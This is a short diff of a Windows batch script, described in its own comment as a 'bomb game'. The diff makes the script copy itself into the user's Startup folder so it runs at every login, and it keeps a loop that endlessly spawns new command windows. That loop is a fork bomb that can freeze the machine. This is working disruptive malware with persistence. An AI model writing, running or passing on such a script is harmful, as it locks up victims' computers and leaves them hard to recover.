@@ -5,10 +5,11 @@ REM And now it turned to a bomb game.
 set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 if not exist "%StartupFolder%\bomb.bat" (
-    echo echo works! > "%StartupFolder%\bomb.bat"
+    copy "%~f0" "%StartupFolder%\"
 )
 
 :loop
 start cmd /k :loop & start cmd & goto loop
 
 goto loop
+
